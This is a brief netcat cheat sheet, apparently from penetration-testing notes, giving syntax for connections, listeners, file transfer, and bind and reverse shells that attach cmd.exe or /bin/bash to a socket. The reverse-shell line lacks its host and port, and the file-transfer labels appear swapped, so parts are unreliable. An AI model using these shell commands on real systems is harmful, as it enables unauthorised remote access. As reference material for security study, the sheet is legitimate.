# Cheat Sheets

## Netcat

| Common Use Case | Syntax |
| :--- | :--- |
| Connect | `nc -nv <target ip> <port>` |
| Listen | `nc -nvl <port>` |
| File Transfer - Send | `nc -nvl <port> > filename` |
| File Transfer - Receive | `nc -nv <target ip> <port> < filename` |
| Bind Shell - Host | `nc -nvl <port> -e <shell>` |
| Rev Shell - Host | `nc -nv  -e <shell>` |
| \`\` |  |

{% hint style="info" %}
&lt;shell&gt; is usually cmd.exe on Windows or /bin/bash on Linux
{% endhint %}

| Command Line Arg | Purpose |
| :--- | :--- |
| -n | Skip DNS lookup |
| -v | Verbsose output |
| -l | Listener mode |
| -e | Connect program to network |



